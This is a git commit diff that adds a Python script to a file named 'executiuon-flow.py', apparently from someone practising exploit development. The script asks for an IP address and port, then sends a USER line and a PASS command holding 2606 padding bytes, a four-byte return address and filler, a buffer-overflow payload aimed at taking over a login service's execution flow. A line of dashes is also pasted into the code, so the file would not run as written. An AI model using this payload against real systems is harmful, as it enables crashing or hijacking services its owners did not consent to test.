c2c03821486445b0151ef1a71cf2d846e1f58a37
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-10-17 16:53:44 +0530

    Update executiuon-flow.py

--- executiuon-flow.py
+++ executiuon-flow.py
@@ -29,4 +29,39 @@ elif (len(ip_address)>0) and (len(port)>0):
     s.send(b"USER HRISHI" + b"\r\n")
     s.send(b"USER " + buffer + b"\r\n")
     s.close()
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
                
+#!/usr/bin/python3
+
+import sys,socket
+
+ip_address=input("Enter the IP address\n")
+port_number=input("Enter the port number\n")
+
+if len(ip_address)==0 or len(port_number)==0:
+    if len(ip_address)>0 and len(port_number)==0:
+        print("*"*50)
+        print("Port number field is empty")
+    elif len(ip_address)==0 and len(port_number)>0:
+        print("*"*50)
+        print("IP address field is empty")
+    elif len(ip_address)==0 and len(port_number)==0:
+        print("*"*50)
+        print("IP address field is empty")
+        print("Port number field is empty")
+    else:
+        print("*"*50)
+        print("Issues with the user input")
+elif len(ip_address)>0 and len(port_number)>0:
+    if not port_number.isdigit():
+
+        print("*"*50)
+        print("Port number field must contain only numeric digits")
+    else:
+        buffer_size=b"A" * 2606 + b"\x8F\x35\x4A\x5F" + b"C"*(2700-4-2606)
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((ip_address,int(port_number)))
+        s.send(b"USER HRISHI" + b"\r\n")
+        s.send(b"PASS " +  buffer_size + b"\r\n")
+        s.close
